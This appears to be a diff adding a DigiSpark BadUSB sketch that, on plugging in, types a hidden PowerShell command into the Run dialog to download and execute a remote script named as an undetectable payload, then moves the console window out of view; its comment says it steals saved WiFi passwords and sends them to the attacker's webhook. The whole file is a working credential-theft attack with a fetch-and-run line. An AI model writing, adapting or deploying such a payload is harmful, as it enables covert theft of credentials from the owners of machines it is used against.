@@ -1,0 +1,46 @@
+/*
+  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
+ rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
+*/
+
+
+#include "DigiKeyboard.h"
+#define KEY_DOWN 0x51 // Keyboard Down Arrow
+#define KEY_ENTER 0x28 //Return/Enter Key
+#define KEY_LEFT_ARROW        0x50 
+void setup() {
+  pinMode(1, OUTPUT); //LED on Model A 
+}
+
+void loop() {
+   
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+ 
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("powershell start powershell -A 'Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/chrome.ps1).Content'"); 
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(4000);
+  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW); 
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
+  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
+  for(int i =0; i < 100; i++)
+    {
+      DigiKeyboard.sendKeyStroke(KEY_DOWN);
+    }
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("exit"); 
+  DigiKeyboard.delay(100);
+  
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+  
+}
